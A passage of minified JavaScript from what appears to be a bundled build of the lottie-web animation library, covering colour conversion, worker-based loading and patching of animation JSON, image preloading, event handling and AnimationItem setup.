            (s = ht), (tt = o), (nt = ft);
            break;
          case 2:
            (s = ft), (tt = o), (nt = gt);
            break;
          case 3:
            (s = ft), (tt = ht), (nt = o);
            break;
          case 4:
            (s = gt), (tt = ft), (nt = o);
            break;
          case 5:
            (s = o), (tt = ft), (nt = ht);
            break;
        }
        return [s, tt, nt];
      }
      function RGBtoHSV(i, a, o) {
        var s = Math.max(i, a, o),
          tt = Math.min(i, a, o),
          nt = s - tt,
          ot,
          st = s === 0 ? 0 : nt / s,
          ft = s / 255;
        switch (s) {
          case tt:
            ot = 0;
            break;
          case i:
            (ot = a - o + nt * (a < o ? 6 : 0)), (ot /= 6 * nt);
            break;
          case a:
            (ot = o - i + nt * 2), (ot /= 6 * nt);
            break;
          case o:
            (ot = i - a + nt * 4), (ot /= 6 * nt);
            break;
        }
        return [ot, st, ft];
      }
      function addSaturationToRGB(i, a) {
        var o = RGBtoHSV(i[0] * 255, i[1] * 255, i[2] * 255);
        return (
          (o[1] += a),
          o[1] > 1 ? (o[1] = 1) : o[1] <= 0 && (o[1] = 0),
          HSVtoRGB(o[0], o[1], o[2])
        );
      }
      function addBrightnessToRGB(i, a) {
        var o = RGBtoHSV(i[0] * 255, i[1] * 255, i[2] * 255);
        return (
          (o[2] += a),
          o[2] > 1 ? (o[2] = 1) : o[2] < 0 && (o[2] = 0),
          HSVtoRGB(o[0], o[1], o[2])
        );
      }
      function addHueToRGB(i, a) {
        var o = RGBtoHSV(i[0] * 255, i[1] * 255, i[2] * 255);
        return (
          (o[0] += a / 360),
          o[0] > 1 ? (o[0] -= 1) : o[0] < 0 && (o[0] += 1),
          HSVtoRGB(o[0], o[1], o[2])
        );
      }
      var rgbToHex = (function () {
          var i = [],
            a,
            o;
          for (a = 0; a < 256; a += 1)
            (o = a.toString(16)), (i[a] = o.length === 1 ? "0" + o : o);
          return function (s, tt, nt) {
            return (
              s < 0 && (s = 0),
              tt < 0 && (tt = 0),
              nt < 0 && (nt = 0),
              "#" + i[s] + i[tt] + i[nt]
            );
          };
        })(),
        setSubframeEnabled = function (a) {
          subframeEnabled = !!a;
        },
        getSubframeEnabled = function () {
          return subframeEnabled;
        },
        setExpressionsPlugin = function (a) {
          expressionsPlugin = a;
        },
        getExpressionsPlugin = function () {
          return expressionsPlugin;
        },
        setExpressionInterfaces = function (a) {
          expressionsInterfaces = a;
        },
        getExpressionInterfaces = function () {
          return expressionsInterfaces;
        },
        setDefaultCurveSegments = function (a) {
          defaultCurveSegments = a;
        },
        getDefaultCurveSegments = function () {
          return defaultCurveSegments;
        },
        setIdPrefix = function (a) {
          idPrefix$1 = a;
        };
      function createNS(i) {
        return document.createElementNS(svgNS, i);
      }
      function _typeof$5(i) {
        "@babel/helpers - typeof";
        return (
          typeof Symbol == "function" && typeof Symbol.iterator == "symbol"
            ? (_typeof$5 = function (o) {
                return typeof o;
              })
            : (_typeof$5 = function (o) {
                return o &&
                  typeof Symbol == "function" &&
                  o.constructor === Symbol &&
                  o !== Symbol.prototype
                  ? "symbol"
                  : typeof o;
              }),
          _typeof$5(i)
        );
      }
      var dataManager = (function () {
          var i = 1,
            a = [],
            o,
            s,
            tt = {
              onmessage: function () {},
              postMessage: function (_t) {
                o({ data: _t });
              },
            },
            nt = {
              postMessage: function (_t) {
                tt.onmessage({ data: _t });
              },
            };
          function ot(vt) {
            if (window.Worker && window.Blob && getWebWorker()) {
              var _t = new Blob(
                  ["var _workerSelf = self; self.onmessage = ", vt.toString()],
                  { type: "text/javascript" }
                ),
                Et = URL.createObjectURL(_t);
              return new Worker(Et);
            }
            return (o = vt), tt;
          }
          function st() {
            s ||
              ((s = ot(function (_t) {
                function Et() {
                  function Pt(Vt, Mt) {
                    var Ft,
                      Tt,
                      At = Vt.length,
                      Lt,
                      jt,
                      Dt,
                      Ut;
                    for (Tt = 0; Tt < At; Tt += 1)
                      if (((Ft = Vt[Tt]), "ks" in Ft && !Ft.completed)) {
                        if (((Ft.completed = !0), Ft.hasMask)) {
                          var Ht = Ft.masksProperties;
                          for (jt = Ht.length, Lt = 0; Lt < jt; Lt += 1)
                            if (Ht[Lt].pt.k.i) $t(Ht[Lt].pt.k);
                            else
                              for (
                                Ut = Ht[Lt].pt.k.length, Dt = 0;
                                Dt < Ut;
                                Dt += 1
                              )
                                Ht[Lt].pt.k[Dt].s && $t(Ht[Lt].pt.k[Dt].s[0]),
                                  Ht[Lt].pt.k[Dt].e && $t(Ht[Lt].pt.k[Dt].e[0]);
                        }
                        Ft.ty === 0
                          ? ((Ft.layers = yt(Ft.refId, Mt)), Pt(Ft.layers, Mt))
                          : Ft.ty === 4
                          ? wt(Ft.shapes)
                          : Ft.ty === 5 && Wt(Ft);
                      }
                  }
                  function bt(Vt, Mt) {
                    if (Vt) {
                      var Ft = 0,
                        Tt = Vt.length;
                      for (Ft = 0; Ft < Tt; Ft += 1)
                        Vt[Ft].t === 1 &&
                          ((Vt[Ft].data.layers = yt(Vt[Ft].data.refId, Mt)),
                          Pt(Vt[Ft].data.layers, Mt));
                    }
                  }
                  function xt(Vt, Mt) {
                    for (var Ft = 0, Tt = Mt.length; Ft < Tt; ) {
                      if (Mt[Ft].id === Vt) return Mt[Ft];
                      Ft += 1;
                    }
                    return null;
                  }
                  function yt(Vt, Mt) {
                    var Ft = xt(Vt, Mt);
                    return Ft
                      ? Ft.layers.__used
                        ? JSON.parse(JSON.stringify(Ft.layers))
                        : ((Ft.layers.__used = !0), Ft.layers)
                      : null;
                  }
                  function wt(Vt) {
                    var Mt,
                      Ft = Vt.length,
                      Tt,
                      At;
                    for (Mt = Ft - 1; Mt >= 0; Mt -= 1)
                      if (Vt[Mt].ty === "sh")
                        if (Vt[Mt].ks.k.i) $t(Vt[Mt].ks.k);
                        else
                          for (
                            At = Vt[Mt].ks.k.length, Tt = 0;
                            Tt < At;
                            Tt += 1
                          )
                            Vt[Mt].ks.k[Tt].s && $t(Vt[Mt].ks.k[Tt].s[0]),
                              Vt[Mt].ks.k[Tt].e && $t(Vt[Mt].ks.k[Tt].e[0]);
                      else Vt[Mt].ty === "gr" && wt(Vt[Mt].it);
                  }
                  function $t(Vt) {
                    var Mt,
                      Ft = Vt.i.length;
                    for (Mt = 0; Mt < Ft; Mt += 1)
                      (Vt.i[Mt][0] += Vt.v[Mt][0]),
                        (Vt.i[Mt][1] += Vt.v[Mt][1]),
                        (Vt.o[Mt][0] += Vt.v[Mt][0]),
                        (Vt.o[Mt][1] += Vt.v[Mt][1]);
                  }
                  function kt(Vt, Mt) {
                    var Ft = Mt ? Mt.split(".") : [100, 100, 100];
                    return Vt[0] > Ft[0]
                      ? !0
                      : Ft[0] > Vt[0]
                      ? !1
                      : Vt[1] > Ft[1]
                      ? !0
                      : Ft[1] > Vt[1]
                      ? !1
                      : Vt[2] > Ft[2]
                      ? !0
                      : Ft[2] > Vt[2]
                      ? !1
                      : null;
                  }
                  var Rt = (function () {
                      var Vt = [4, 4, 14];
                      function Mt(Tt) {
                        var At = Tt.t.d;
                        Tt.t.d = { k: [{ s: At, t: 0 }] };
                      }
                      function Ft(Tt) {
                        var At,
                          Lt = Tt.length;
                        for (At = 0; At < Lt; At += 1)
                          Tt[At].ty === 5 && Mt(Tt[At]);
                      }
                      return function (Tt) {
                        if (kt(Vt, Tt.v) && (Ft(Tt.layers), Tt.assets)) {
                          var At,
                            Lt = Tt.assets.length;
                          for (At = 0; At < Lt; At += 1)
                            Tt.assets[At].layers && Ft(Tt.assets[At].layers);
                        }
                      };
                    })(),
                    It = (function () {
                      var Vt = [4, 7, 99];
                      return function (Mt) {
                        if (Mt.chars && !kt(Vt, Mt.v)) {
                          var Ft,
                            Tt = Mt.chars.length;
                          for (Ft = 0; Ft < Tt; Ft += 1) {
                            var At = Mt.chars[Ft];
                            At.data &&
                              At.data.shapes &&
                              (wt(At.data.shapes),
                              (At.data.ip = 0),
                              (At.data.op = 99999),
                              (At.data.st = 0),
                              (At.data.sr = 1),
                              (At.data.ks = {
                                p: { k: [0, 0], a: 0 },
                                s: { k: [100, 100], a: 0 },
                                a: { k: [0, 0], a: 0 },
                                r: { k: 0, a: 0 },
                                o: { k: 100, a: 0 },
                              }),
                              Mt.chars[Ft].t ||
                                (At.data.shapes.push({ ty: "no" }),
                                At.data.shapes[0].it.push({
                                  p: { k: [0, 0], a: 0 },
                                  s: { k: [100, 100], a: 0 },
                                  a: { k: [0, 0], a: 0 },
                                  r: { k: 0, a: 0 },
                                  o: { k: 100, a: 0 },
                                  sk: { k: 0, a: 0 },
                                  sa: { k: 0, a: 0 },
                                  ty: "tr",
                                })));
                          }
                        }
                      };
                    })(),
                    Ot = (function () {
                      var Vt = [5, 7, 15];
                      function Mt(Tt) {
                        var At = Tt.t.p;
                        typeof At.a == "number" && (At.a = { a: 0, k: At.a }),
                          typeof At.p == "number" && (At.p = { a: 0, k: At.p }),
                          typeof At.r == "number" && (At.r = { a: 0, k: At.r });
                      }
                      function Ft(Tt) {
                        var At,
                          Lt = Tt.length;
                        for (At = 0; At < Lt; At += 1)
                          Tt[At].ty === 5 && Mt(Tt[At]);
                      }
                      return function (Tt) {
                        if (kt(Vt, Tt.v) && (Ft(Tt.layers), Tt.assets)) {
                          var At,
                            Lt = Tt.assets.length;
                          for (At = 0; At < Lt; At += 1)
                            Tt.assets[At].layers && Ft(Tt.assets[At].layers);
                        }
                      };
                    })(),
                    Nt = (function () {
                      var Vt = [4, 1, 9];
                      function Mt(Tt) {
                        var At,
                          Lt = Tt.length,
                          jt,
                          Dt;
                        for (At = 0; At < Lt; At += 1)
                          if (Tt[At].ty === "gr") Mt(Tt[At].it);
                          else if (Tt[At].ty === "fl" || Tt[At].ty === "st")
                            if (Tt[At].c.k && Tt[At].c.k[0].i)
                              for (
                                Dt = Tt[At].c.k.length, jt = 0;
                                jt < Dt;
                                jt += 1
                              )
                                Tt[At].c.k[jt].s &&
                                  ((Tt[At].c.k[jt].s[0] /= 255),
                                  (Tt[At].c.k[jt].s[1] /= 255),
                                  (Tt[At].c.k[jt].s[2] /= 255),
                                  (Tt[At].c.k[jt].s[3] /= 255)),
                                  Tt[At].c.k[jt].e &&
                                    ((Tt[At].c.k[jt].e[0] /= 255),
                                    (Tt[At].c.k[jt].e[1] /= 255),
                                    (Tt[At].c.k[jt].e[2] /= 255),
                                    (Tt[At].c.k[jt].e[3] /= 255));
                            else
                              (Tt[At].c.k[0] /= 255),
                                (Tt[At].c.k[1] /= 255),
                                (Tt[At].c.k[2] /= 255),
                                (Tt[At].c.k[3] /= 255);
                      }
                      function Ft(Tt) {
                        var At,
                          Lt = Tt.length;
                        for (At = 0; At < Lt; At += 1)
                          Tt[At].ty === 4 && Mt(Tt[At].shapes);
                      }
                      return function (Tt) {
                        if (kt(Vt, Tt.v) && (Ft(Tt.layers), Tt.assets)) {
                          var At,
                            Lt = Tt.assets.length;
                          for (At = 0; At < Lt; At += 1)
                            Tt.assets[At].layers && Ft(Tt.assets[At].layers);
                        }
                      };
                    })(),
                    zt = (function () {
                      var Vt = [4, 4, 18];
                      function Mt(Tt) {
                        var At,
                          Lt = Tt.length,
                          jt,
                          Dt;
                        for (At = Lt - 1; At >= 0; At -= 1)
                          if (Tt[At].ty === "sh")
                            if (Tt[At].ks.k.i) Tt[At].ks.k.c = Tt[At].closed;
                            else
                              for (
                                Dt = Tt[At].ks.k.length, jt = 0;
                                jt < Dt;
                                jt += 1
                              )
                                Tt[At].ks.k[jt].s &&
                                  (Tt[At].ks.k[jt].s[0].c = Tt[At].closed),
                                  Tt[At].ks.k[jt].e &&
                                    (Tt[At].ks.k[jt].e[0].c = Tt[At].closed);
                          else Tt[At].ty === "gr" && Mt(Tt[At].it);
                      }
                      function Ft(Tt) {
                        var At,
                          Lt,
                          jt = Tt.length,
                          Dt,
                          Ut,
                          Ht,
                          Kt;
                        for (Lt = 0; Lt < jt; Lt += 1) {
                          if (((At = Tt[Lt]), At.hasMask)) {
                            var qt = At.masksProperties;
                            for (Ut = qt.length, Dt = 0; Dt < Ut; Dt += 1)
                              if (qt[Dt].pt.k.i) qt[Dt].pt.k.c = qt[Dt].cl;
                              else
                                for (
                                  Kt = qt[Dt].pt.k.length, Ht = 0;
                                  Ht < Kt;
                                  Ht += 1
                                )
                                  qt[Dt].pt.k[Ht].s &&
                                    (qt[Dt].pt.k[Ht].s[0].c = qt[Dt].cl),
                                    qt[Dt].pt.k[Ht].e &&
                                      (qt[Dt].pt.k[Ht].e[0].c = qt[Dt].cl);
                          }
                          At.ty === 4 && Mt(At.shapes);
                        }
                      }
                      return function (Tt) {
                        if (kt(Vt, Tt.v) && (Ft(Tt.layers), Tt.assets)) {
                          var At,
                            Lt = Tt.assets.length;
                          for (At = 0; At < Lt; At += 1)
                            Tt.assets[At].layers && Ft(Tt.assets[At].layers);
                        }
                      };
                    })();
                  function Bt(Vt) {
                    Vt.__complete ||
                      (Nt(Vt),
                      Rt(Vt),
                      It(Vt),
                      Ot(Vt),
                      zt(Vt),
                      Pt(Vt.layers, Vt.assets),
                      bt(Vt.chars, Vt.assets),
                      (Vt.__complete = !0));
                  }
                  function Wt(Vt) {
                    Vt.t.a.length === 0 && "m" in Vt.t.p;
                  }
                  var Gt = {};
                  return (
                    (Gt.completeData = Bt),
                    (Gt.checkColors = Nt),
                    (Gt.checkChars = It),
                    (Gt.checkPathProperties = Ot),
                    (Gt.checkShapes = zt),
                    (Gt.completeLayers = Pt),
                    Gt
                  );
                }
                if (
                  (nt.dataManager || (nt.dataManager = Et()),
                  nt.assetLoader ||
                    (nt.assetLoader = (function () {
                      function Pt(xt) {
                        var yt = xt.getResponseHeader("content-type");
                        return (yt &&
                          xt.responseType === "json" &&
                          yt.indexOf("json") !== -1) ||
                          (xt.response && _typeof$5(xt.response) === "object")
                          ? xt.response
                          : xt.response && typeof xt.response == "string"
                          ? JSON.parse(xt.response)
                          : xt.responseText
                          ? JSON.parse(xt.responseText)
                          : null;
                      }
                      function bt(xt, yt, wt, $t) {
                        var kt,
                          Rt = new XMLHttpRequest();
                        try {
                          Rt.responseType = "json";
                        } catch {}
                        Rt.onreadystatechange = function () {
                          if (Rt.readyState === 4)
                            if (Rt.status === 200) (kt = Pt(Rt)), wt(kt);
                            else
                              try {
                                (kt = Pt(Rt)), wt(kt);
                              } catch (It) {
                                $t && $t(It);
                              }
                        };
                        try {
                          Rt.open(["G", "E", "T"].join(""), xt, !0);
                        } catch {
                          Rt.open(["G", "E", "T"].join(""), yt + "/" + xt, !0);
                        }
                        Rt.send();
                      }
                      return { load: bt };
                    })()),
                  _t.data.type === "loadAnimation")
                )
                  nt.assetLoader.load(
                    _t.data.path,
                    _t.data.fullPath,
                    function (Pt) {
                      nt.dataManager.completeData(Pt),
                        nt.postMessage({
                          id: _t.data.id,
                          payload: Pt,
                          status: "success",
                        });
                    },
                    function () {
                      nt.postMessage({ id: _t.data.id, status: "error" });
                    }
                  );
                else if (_t.data.type === "complete") {
                  var Ct = _t.data.animation;
                  nt.dataManager.completeData(Ct),
                    nt.postMessage({
                      id: _t.data.id,
                      payload: Ct,
                      status: "success",
                    });
                } else
                  _t.data.type === "loadData" &&
                    nt.assetLoader.load(
                      _t.data.path,
                      _t.data.fullPath,
                      function (Pt) {
                        nt.postMessage({
                          id: _t.data.id,
                          payload: Pt,
                          status: "success",
                        });
                      },
                      function () {
                        nt.postMessage({ id: _t.data.id, status: "error" });
                      }
                    );
              })),
              (s.onmessage = function (vt) {
                var _t = vt.data,
                  Et = _t.id,
                  Ct = a[Et];
                (a[Et] = null),
                  _t.status === "success"
                    ? Ct.onComplete(_t.payload)
                    : Ct.onError && Ct.onError();
              }));
          }
          function ft(vt, _t) {
            i += 1;
            var Et = "processId_" + i;
            return (a[Et] = { onComplete: vt, onError: _t }), Et;
          }
          function ht(vt, _t, Et) {
            st();
            var Ct = ft(_t, Et);
            s.postMessage({
              type: "loadAnimation",
              path: vt,
              fullPath: window.location.origin + window.location.pathname,
              id: Ct,
            });
          }
          function gt(vt, _t, Et) {
            st();
            var Ct = ft(_t, Et);
            s.postMessage({
              type: "loadData",
              path: vt,
              fullPath: window.location.origin + window.location.pathname,
              id: Ct,
            });
          }
          function St(vt, _t, Et) {
            st();
            var Ct = ft(_t, Et);
            s.postMessage({ type: "complete", animation: vt, id: Ct });
          }
          return { loadAnimation: ht, loadData: gt, completeAnimation: St };
        })(),
        ImagePreloader = (function () {
          var i = (function () {
            var bt = createTag("canvas");
            (bt.width = 1), (bt.height = 1);
            var xt = bt.getContext("2d");
            return (
              (xt.fillStyle = "rgba(0,0,0,0)"), xt.fillRect(0, 0, 1, 1), bt
            );
          })();
          function a() {
            (this.loadedAssets += 1),
              this.loadedAssets === this.totalImages &&
                this.loadedFootagesCount === this.totalFootages &&
                this.imagesLoadedCb &&
                this.imagesLoadedCb(null);
          }
          function o() {
            (this.loadedFootagesCount += 1),
              this.loadedAssets === this.totalImages &&
                this.loadedFootagesCount === this.totalFootages &&
                this.imagesLoadedCb &&
                this.imagesLoadedCb(null);
          }
          function s(bt, xt, yt) {
            var wt = "";
            if (bt.e) wt = bt.p;
            else if (xt) {
              var $t = bt.p;
              $t.indexOf("images/") !== -1 && ($t = $t.split("/")[1]),
                (wt = xt + $t);
            } else (wt = yt), (wt += bt.u ? bt.u : ""), (wt += bt.p);
            return wt;
          }
          function tt(bt) {
            var xt = 0,
              yt = setInterval(
                function () {
                  var wt = bt.getBBox();
                  (wt.width || xt > 500) &&
                    (this._imageLoaded(), clearInterval(yt)),
                    (xt += 1);
                }.bind(this),
                50
              );
          }
          function nt(bt) {
            var xt = s(bt, this.assetsPath, this.path),
              yt = createNS("image");
            isSafari
              ? this.testImageLoaded(yt)
              : yt.addEventListener("load", this._imageLoaded, !1),
              yt.addEventListener(
                "error",
                function () {
                  (wt.img = i), this._imageLoaded();
                }.bind(this),
                !1
              ),
              yt.setAttributeNS("http://www.w3.org/1999/xlink", "href", xt),
              this._elementHelper.append
                ? this._elementHelper.append(yt)
                : this._elementHelper.appendChild(yt);
            var wt = { img: yt, assetData: bt };
            return wt;
          }
          function ot(bt) {
            var xt = s(bt, this.assetsPath, this.path),
              yt = createTag("img");
            (yt.crossOrigin = "anonymous"),
              yt.addEventListener("load", this._imageLoaded, !1),
              yt.addEventListener(
                "error",
                function () {
                  (wt.img = i), this._imageLoaded();
                }.bind(this),
                !1
              ),
              (yt.src = xt);
            var wt = { img: yt, assetData: bt };
            return wt;
          }
          function st(bt) {
            var xt = { assetData: bt },
              yt = s(bt, this.assetsPath, this.path);
            return (
              dataManager.loadData(
                yt,
                function (wt) {
                  (xt.img = wt), this._footageLoaded();
                }.bind(this),
                function () {
                  (xt.img = {}), this._footageLoaded();
                }.bind(this)
              ),
              xt
            );
          }
          function ft(bt, xt) {
            this.imagesLoadedCb = xt;
            var yt,
              wt = bt.length;
            for (yt = 0; yt < wt; yt += 1)
              bt[yt].layers ||
                (!bt[yt].t || bt[yt].t === "seq"
                  ? ((this.totalImages += 1),
                    this.images.push(this._createImageData(bt[yt])))
                  : bt[yt].t === 3 &&
                    ((this.totalFootages += 1),
                    this.images.push(this.createFootageData(bt[yt]))));
          }
          function ht(bt) {
            this.path = bt || "";
          }
          function gt(bt) {
            this.assetsPath = bt || "";
          }
          function St(bt) {
            for (var xt = 0, yt = this.images.length; xt < yt; ) {
              if (this.images[xt].assetData === bt) return this.images[xt].img;
              xt += 1;
            }
            return null;
          }
          function vt() {
            (this.imagesLoadedCb = null), (this.images.length = 0);
          }
          function _t() {
            return this.totalImages === this.loadedAssets;
          }
          function Et() {
            return this.totalFootages === this.loadedFootagesCount;
          }
          function Ct(bt, xt) {
            bt === "svg"
              ? ((this._elementHelper = xt),
                (this._createImageData = this.createImageData.bind(this)))
              : (this._createImageData = this.createImgData.bind(this));
          }
          function Pt() {
            (this._imageLoaded = a.bind(this)),
              (this._footageLoaded = o.bind(this)),
              (this.testImageLoaded = tt.bind(this)),
              (this.createFootageData = st.bind(this)),
              (this.assetsPath = ""),
              (this.path = ""),
              (this.totalImages = 0),
              (this.totalFootages = 0),
              (this.loadedAssets = 0),
              (this.loadedFootagesCount = 0),
              (this.imagesLoadedCb = null),
              (this.images = []);
          }
          return (
            (Pt.prototype = {
              loadAssets: ft,
              setAssetsPath: gt,
              setPath: ht,
              loadedImages: _t,
              loadedFootages: Et,
              destroy: vt,
              getAsset: St,
              createImgData: ot,
              createImageData: nt,
              imageLoaded: a,
              footageLoaded: o,
              setCacheType: Ct,
            }),
            Pt
          );
        })();
      function BaseEvent() {}
      BaseEvent.prototype = {
        triggerEvent: function (a, o) {
          if (this._cbs[a])
            for (var s = this._cbs[a], tt = 0; tt < s.length; tt += 1) s[tt](o);
        },
        addEventListener: function (a, o) {
          return (
            this._cbs[a] || (this._cbs[a] = []),
            this._cbs[a].push(o),
            function () {
              this.removeEventListener(a, o);
            }.bind(this)
          );
        },
        removeEventListener: function (a, o) {
          if (!o) this._cbs[a] = null;
          else if (this._cbs[a]) {
            for (var s = 0, tt = this._cbs[a].length; s < tt; )
              this._cbs[a][s] === o &&
                (this._cbs[a].splice(s, 1), (s -= 1), (tt -= 1)),
                (s += 1);
            this._cbs[a].length || (this._cbs[a] = null);
          }
        },
      };
      var markerParser = (function () {
          function i(a) {
            for (
              var o = a.split(`\r
`),
                s = {},
                tt,
                nt = 0,
                ot = 0;
              ot < o.length;
              ot += 1
            )
              (tt = o[ot].split(":")),
                tt.length === 2 && ((s[tt[0]] = tt[1].trim()), (nt += 1));
            if (nt === 0) throw new Error();
            return s;
          }
          return function (a) {
            for (var o = [], s = 0; s < a.length; s += 1) {
              var tt = a[s],
                nt = { time: tt.tm, duration: tt.dr };
              try {
                nt.payload = JSON.parse(a[s].cm);
              } catch {
                try {
                  nt.payload = i(a[s].cm);
                } catch {
                  nt.payload = { name: a[s].cm };
                }
              }
              o.push(nt);
            }
            return o;
          };
        })(),
        ProjectInterface = (function () {
          function i(a) {
            this.compositions.push(a);
          }
          return function () {
            function a(o) {
              for (var s = 0, tt = this.compositions.length; s < tt; ) {
                if (
                  this.compositions[s].data &&
                  this.compositions[s].data.nm === o
                )
                  return (
                    this.compositions[s].prepareFrame &&
                      this.compositions[s].data.xt &&
                      this.compositions[s].prepareFrame(this.currentFrame),
                    this.compositions[s].compInterface
                  );
                s += 1;
              }
              return null;
            }
            return (
              (a.compositions = []),
              (a.currentFrame = 0),
              (a.registerComposition = i),
              a
            );
          };
        })(),
        renderers = {},
        registerRenderer = function (a, o) {
          renderers[a] = o;
        };
      function getRenderer(i) {
        return renderers[i];
      }
      function getRegisteredRenderer() {
        if (renderers.canvas) return "canvas";
        for (var i in renderers) if (renderers[i]) return i;
        return "";
      }
      function _typeof$4(i) {
        "@babel/helpers - typeof";
        return (
          typeof Symbol == "function" && typeof Symbol.iterator == "symbol"
            ? (_typeof$4 = function (o) {
                return typeof o;
              })
            : (_typeof$4 = function (o) {
                return o &&
                  typeof Symbol == "function" &&
                  o.constructor === Symbol &&
                  o !== Symbol.prototype
                  ? "symbol"
                  : typeof o;
              }),
          _typeof$4(i)
        );
      }
      var AnimationItem = function () {
        (this._cbs = []),
          (this.name = ""),
          (this.path = ""),
          (this.isLoaded = !1),
          (this.currentFrame = 0),
          (this.currentRawFrame = 0),
          (this.firstFrame = 0),
          (this.totalFrames = 0),
          (this.frameRate = 0),
          (this.frameMult = 0),
          (this.playSpeed = 1),
          (this.playDirection = 1),
          (this.playCount = 0),
          (this.animationData = {}),
          (this.assets = []),
          (this.isPaused = !0),
          (this.autoplay = !1),
          (this.loop = !0),
          (this.renderer = null),
          (this.animationID = createElementID()),
          (this.assetsPath = ""),
          (this.timeCompleted = 0),
          (this.segmentPos = 0),
          (this.isSubframeEnabled = getSubframeEnabled()),
          (this.segments = []),
          (this._idle = !0),
          (this._completedLoop = !1),
          (this.projectInterface = ProjectInterface()),
          (this.imagePreloader = new ImagePreloader()),
          (this.audioController = audioControllerFactory()),
          (this.markers = []),
          (this.configAnimation = this.configAnimation.bind(this)),
          (this.onSetupError = this.onSetupError.bind(this)),
          (this.onSegmentComplete = this.onSegmentComplete.bind(this)),
          (this.drawnFrameEvent = new BMEnterFrameEvent("drawnFrame", 0, 0, 0)),
          (this.expressionsPlugin = getExpressionsPlugin());
      };
      extendPrototype([BaseEvent], AnimationItem),
        (AnimationItem.prototype.setParams = function (i) {
          (i.wrapper || i.container) &&
            (this.wrapper = i.wrapper || i.container);
          var a = "svg";
          i.animType ? (a = i.animType) : i.renderer && (a = i.renderer);
          var o = getRenderer(a);
          (this.renderer = new o(this, i.rendererSettings)),
            this.imagePreloader.setCacheType(a, this.renderer.globalData.defs),
            this.renderer.setProjectInterface(this.projectInterface),
            (this.animType = a),
            i.loop === "" ||
            i.loop === null ||
            i.loop === void 0 ||
            i.loop === !0
              ? (this.loop = !0)
              : i.loop === !1
              ? (this.loop = !1)
              : (this.loop = parseInt(i.loop, 10)),
            (this.autoplay = "autoplay" in i ? i.autoplay : !0),
            (this.name = i.name ? i.name : ""),
            (this.autoloadSegments = Object.prototype.hasOwnProperty.call(
              i,
              "autoloadSegments"
            )
              ? i.autoloadSegments
              : !0),
            (this.assetsPath = i.assetsPath),
            (this.initialSegment = i.initialSegment),
            i.audioFactory &&
              this.audioController.setAudioFactory(i.audioFactory),
            i.animationData
              ? this.setupAnimation(i.animationData)
              : i.path &&
                (i.path.lastIndexOf("\\") !== -1
                  ? (this.path = i.path.substr(0, i.path.lastIndexOf("\\") + 1))
                  : (this.path = i.path.substr(0, i.path.lastIndexOf("/") + 1)),
                (this.fileName = i.path.substr(i.path.lastIndexOf("/") + 1)),
                (this.fileName = this.fileName.substr(
                  0,
                  this.fileName.lastIndexOf(".json")
                )),
                dataManager.loadAnimation(
                  i.path,
                  this.configAnimation,
                  this.onSetupError
                ));
        }),
        (AnimationItem.prototype.onSetupError = function () {
          this.trigger("data_failed");
        }),
        (AnimationItem.prototype.setupAnimation = function (i) {
          dataManager.completeAnimation(i, this.configAnimation);
        }),
        (AnimationItem.prototype.setData = function (i, a) {
          a && _typeof$4(a) !== "object" && (a = JSON.parse(a));
          var o = { wrapper: i, animationData: a },
            s = i.attributes;
          (o.path = s.getNamedItem("data-animation-path")
            ? s.getNamedItem("data-animation-path").value
            : s.getNamedItem("data-bm-path")
            ? s.getNamedItem("data-bm-path").value
            : s.getNamedItem("bm-path")
            ? s.getNamedItem("bm-path").value
            : ""),
            (o.animType = s.getNamedItem("data-anim-type")
              ? s.getNamedItem("data-anim-type").value
              : s.getNamedItem("data-bm-type")
              ? s.getNamedItem("data-bm-type").value
              : s.getNamedItem("bm-type")
              ? s.getNamedItem("bm-type").value
              : s.getNamedItem("data-bm-renderer")
              ? s.getNamedItem("data-bm-renderer").value
              : s.getNamedItem("bm-renderer")
              ? s.getNamedItem("bm-renderer").value
              : getRegisteredRenderer() || "canvas");
          var tt = s.getNamedItem("data-anim-loop")
            ? s.getNamedItem("data-anim-loop").value
            : s.getNamedItem("data-bm-loop")
            ? s.getNamedItem("data-bm-loop").value
            : s.getNamedItem("bm-loop")
            ? s.getNamedItem("bm-loop").value
            : "";
          tt === "false"
            ? (o.loop = !1)
            : tt === "true"
            ? (o.loop = !0)
            : tt !== "" && (o.loop = parseInt(tt, 10));
          var nt = s.getNamedItem("data-anim-autoplay")
            ? s.getNamedItem("data-anim-autoplay").value
            : s.getNamedItem("data-bm-autoplay")
            ? s.getNamedItem("data-bm-autoplay").value
            : s.getNamedItem("bm-autoplay")
            ? s.getNamedItem("bm-autoplay").value
            : !0;
          (o.autoplay = nt !== "false"),
            (o.name = s.getNamedItem("data-name")
              ? s.getNamedItem("data-name").value
              : s.getNamedItem("data-bm-name")
              ? s.getNamedItem("data-bm-name").value
              : s.getNamedItem("bm-name")
              ? s.getNamedItem("bm-name").value
              : "");
          var ot = s.getNamedItem("data-anim-prerender")
            ? s.getNamedItem("data-anim-prerender").value
            : s.getNamedItem("data-bm-prerender")
            ? s.getNamedItem("data-bm-prerender").value
            : s.getNamedItem("bm-prerender")
            ? s.getNamedItem("bm-prerender").value
            : "";
          ot === "false" && (o.prerender = !1),
            o.path ? this.setParams(o) : this.trigger("destroy");
        }),
        (AnimationItem.prototype.includeLayers = function (i) {
          i.op > this.animationData.op &&
            ((this.animationData.op = i.op),
            (this.totalFrames = Math.floor(i.op - this.animationData.ip)));
          var a = this.animationData.layers,
            o,
            s = a.length,
            tt = i.layers,
            nt,
            ot = tt.length;
          for (nt = 0; nt < ot; nt += 1)
            for (o = 0; o < s; ) {
              if (a[o].id === tt[nt].id) {
                a[o] = tt[nt];
                break;
              }
              o += 1;
            }
          if (
            ((i.chars || i.fonts) &&
              (this.renderer.globalData.fontManager.addChars(i.chars),
              this.renderer.globalData.fontManager.addFonts(
                i.fonts,
                this.renderer.globalData.defs
              )),
            i.assets)
          )
            for (s = i.assets.length, o = 0; o < s; o += 1)
              this.animationData.assets.push(i.assets[o]);
          (this.animationData.__complete = !1),
            dataManager.completeAnimation(
              this.animationData,
              this.onSegmentComplete
            );
        }),
        (AnimationItem.prototype.onSegmentComplete = function (i) {
          this.animationData = i;
          var a = getExpressionsPlugin();
          a && a.initExpressions(this), this.loadNextSegment();
        }),
        (AnimationItem.prototype.loadNextSegment = function () {
          var i = this.animationData.segments;
          if (!i || i.length === 0 || !this.autoloadSegments) {
            this.trigger("data_ready"), (this.timeCompleted = this.totalFrames);
            return;
          }
          var a = i.shift();
          this.timeCompleted = a.time * this.frameRate;
          var o = this.path + this.fileName + "_" + this.segmentPos + ".json";
          (this.segmentPos += 1),
            dataManager.loadData(
              o,
              this.includeLayers.bind(this),
              function () {
                this.trigger("data_failed");
              }.bind(this)
            );
        }),
